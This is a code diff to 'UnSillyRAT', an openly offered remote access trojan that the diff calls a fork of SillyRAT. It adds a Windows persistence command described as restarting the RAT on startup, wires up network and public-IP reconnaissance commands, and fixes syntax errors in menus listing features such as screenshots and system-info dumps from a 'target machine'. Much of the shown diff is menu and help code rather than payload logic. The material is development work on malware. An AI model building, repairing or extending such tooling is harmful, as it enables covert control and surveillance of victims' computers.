@@ -18,9 +18,9 @@ import tabulate
 __LOGO__ = """
  _   _       ____  _ _ _       ____      _  _____ 
 | | | |_ __ / ___|(_) | |_   _|  _ \    / \|_   _|
-| | | | '_ \\___ \| | | | | | | |_) |  / _ \ | |  
+| | | | '_ \\\\___ \\| | | | | | | |_) |  / _ \\ | |  
 | |_| | | | |___) | | | | |_| |  _ <  / ___ \| |  
- \___/|_| |_|____/|_|_|_|\__, |_| \_\/_/   \_\_|  
+ \___/|_| |_|____/|_|_|_|\\__, |_| \\_\\/_/   \\_\\_|  
                          |___/                    
                                          %s v1.0
 """
@@ -68,7 +68,18 @@ connection to server and do commands.
 """
 
 __HELP__INFO___ = """
+UnSillyRAT is a fork of hash3liZer/SillyRAT by @hirusha-adi
 
+The Original Contributers upto now are:
+    + hash3liZer
+    + TheFlash2k
+    + jbsec
+    + weirdo-hash
+
+This fork has three new improved commands, They are:
+    1. networkinfo - Show Network Adapter and IP Info
+    2. publicip - Get the Public IP info of the client
+    3. startup - Start the RAT again on startup (Windows Only)
 """
 
 
@@ -155,7 +166,8 @@ class PULL:
             ('sysinfo', 'Dump System, Processor, CPU and Network Information'),
             ('screenshot', 'Take Screenshot on Target Machine and Save on Local'),
             ('networkinfo', 'Show Network Adapter and IP Info'),
-            ('publicip', 'Get the Public IP info of the client')
+            ('publicip', 'Get the Public IP info of the client'),
+            ('startup', 'Start the RAT again on startup (Windows Only)'),
             ('exit', 'Exit from UnSillyRAT!')
         ]
         sys.stdout.write("\n")
@@ -524,7 +536,7 @@ class COMMCENTER:
                 headers = (pull.BOLD + 'Information' + pull.END,
                            pull.BOLD + 'Value' + pull.END)
                 lister = [
-                    ('IP', str(result).strip())
+                    ('IP', str(result).strip()),
                     ('Country', str(ipinfor["country"])),
                     ('Country Code', str(ipinfor["countryCode"])),
                     ('Region', str(ipinfor["region"])),
@@ -645,6 +657,10 @@ class INTERFACE(COMMCENTER):
                 self.c_sysinfo()
             elif vals[0] == "screenshot":
                 self.c_screenshot()
+            elif vals[0] == "networkinfo":
+                self.c_networkinfo()
+            elif vals[0] == "publicip":
+                self.c_publicip()
 
     def launch(self):
         pull.print(
@@ -823,7 +839,7 @@ class GENERATOR:
 
 class PARSER:
 
-    COMMANDS = ['bind', 'generate']
+    COMMANDS = ['bind', 'generate', 'info']
 
     def __init__(self, prs):
         self.mode = self.v_mode(prs.mode, prs.help)
@@ -838,6 +854,8 @@ class PARSER:
             self.output = self.v_output(prs.output)
             self.source = prs.source
             self.persistence = prs.persistence
+        elif self.mode == "info":
+            pull.help_info()
 
     def v_help(self, hl):
         if hl:
